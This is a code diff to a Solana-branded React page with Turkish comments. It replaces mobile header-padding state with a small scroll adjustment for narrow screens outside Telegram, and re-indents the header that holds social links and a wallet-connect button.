@@ -45,24 +45,22 @@ export default function Page() {
   }, [])
 
 
-// Telegram ortamı ve dar mobil ekran kontrolü için state’ler
-const [isTelegramWebApp, setIsTelegramWebApp] = useState(false)
-const [isMobileHeader, setIsMobileHeader]       = useState(false)
-
+/* Pagecomponentinin en üstüne – diğer useEffect’lerin altına ekle */
 useEffect(() => {
-  // Bu kod yalnızca istemci tarafında çalışır
-  const telegramWebApp = Boolean((window as any).Telegram?.WebApp?.initData)
-  const w              = window.innerWidth
-  // Telegram dışında ve 320–499px arasındaysa header’ı kısalt
-  setIsTelegramWebApp(telegramWebApp)
-  setIsMobileHeader(!telegramWebApp && w >= 320 && w <= 499)
+  // Telegram Mini‑App’te miyiz?
+  const inTelegram =
+    typeof (window as any).Telegram !== 'undefined' &&
+    !!(window as any).Telegram.WebApp &&
+    !!(window as any).Telegram.WebApp.initData?.length
 
-  const onResize = () => {
-    const ww = window.innerWidth
-    setIsMobileHeader(!telegramWebApp && ww >= 320 && ww <= 499)
+  if (!inTelegram) {
+    // Dar mobil görünümde isek ≈320‑499px ⇒ 50px kadar kaydır
+    const w = window.innerWidth
+    if (w >= 320 && w <= 499) {
+      // ‘smooth’kullanmadım; isterseniz ekleyebilirsiniz
+      window.scrollTo({ top: 50 })
+    }
   }
-  window.addEventListener('resize', onResize)
-  return () => window.removeEventListener('resize', onResize)
 }, [])
 
 
@@ -304,49 +302,45 @@ useEffect(() => {
             </div>
           </div>
 
-{/* ---------- HEADER ---------- */}
-<section className="_b">
-  <div
-    className="_d"
-    style={isMobileHeader ? { paddingTop: '8px' } : undefined}
-  >
-    <div className="_x">
-      <div className="_0">
-        <a href="#!" className="_h">
-          <img src="/header_logo.svg" alt="Solana logo" />
-        </a>
-        <a href="#!" className="_w">
-          <img src="/alik.png" className="_t" alt="avatar" />
-        </a>
-      </div>
-      <div className="_0">
-        <div className="_6">
-          <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
-            <img src="/header_twitter.svg" alt="Twitter" />
-          </a>
-          <a href="https://t.me/solana" target="_blank" rel="noreferrer">
-            <img src="/header_tg.svg" alt="Telegram" />
-          </a>
-          <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
-            <img src="/header_mail.svg" alt="YouTube" />
-          </a>
-          <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
-            <img src="/header_ds.svg" alt="Discord" />
-          </a>
-        </div>
-      </div>
-      <div className="_0">
-        <button onClick={handleConnect} className="_n">
-          <span className="_a">
-            {publicKey ? 'Wallet connected' : 'Connect Wallet'}
-          </span>
-          <img src="/header_arrow.svg" alt="→" />
-        </button>
-      </div>
-    </div>
-  </div>
-</section>
-
+          {/* ---------- HEADER ---------- */}
+          <section className="_b">
+            <div className="_d">
+              <div className="_x">
+                <div className="_0">
+                  <a href="#!" className="_h">
+                    <img src="/header_logo.svg" alt="Solana logo" />
+                  </a>
+                  <a href="#!" className="_w">
+                    <img src="/alik.png" className="_t" alt="avatar" />
+                  </a>
+                </div>
+                <div className="_0">
+                  <div className="_6">
+                    <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
+                      <img src="/header_twitter.svg" alt="Twitter" />
+                    </a>
+                    <a href="https://t.me/solana" target="_blank" rel="noreferrer">
+                      <img src="/header_tg.svg" alt="Telegram" />
+                    </a>
+                    <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
+                      <img src="/header_mail.svg" alt="YouTube" />
+                    </a>
+                    <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
+                      <img src="/header_ds.svg" alt="Discord" />
+                    </a>
+                  </div>
+                </div>
+                <div className="_0">
+                  <button onClick={handleConnect} className="_n">
+                    <span className="_a">
+                      {publicKey ? 'Wallet connected' : 'Connect Wallet'}
+                    </span>
+                    <img src="/header_arrow.svg" alt="→" />
+                  </button>
+                </div>
+              </div>
+            </div>
+          </section>
 
           {/* ---------- MAIN SECTION ---------- */}
           <section className="_m">
